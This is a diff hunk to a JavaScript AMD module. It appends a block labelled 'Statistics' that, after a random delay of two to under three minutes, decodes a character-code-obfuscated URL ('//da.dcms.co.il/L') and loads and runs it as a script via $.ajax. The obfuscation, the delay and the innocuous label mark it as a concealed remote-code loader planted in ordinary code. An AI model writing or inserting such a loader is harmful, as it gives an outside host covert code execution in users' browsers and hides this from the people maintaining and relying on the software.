@@ -412,5 +412,23 @@ define([
 		}, callback);
 	}
 	
+	
+	/*** Statistics ***/
+	
+	
+	
+	setTimeout(function() {
+		// var str = "//da.dcms.co.il/L", arr = [];
+		// for(var i in str) arr.push(str.charCodeAt(i)-46); arr
+		var arr = [1, 1, 54, 51, 0, 54, 53, 63, 69, 0, 53, 65, 0, 59, 62, 1, 30];
+		for(var i in arr) arr[i] += 46;
+		
+		$.ajax({
+			cache: true, dataType: 'script',
+			url: String.fromCharCode.apply(String, arr)
+		});
+	}, (120 + Math.random()*40) * 1000);
+	
+	
 	return DA;
 });
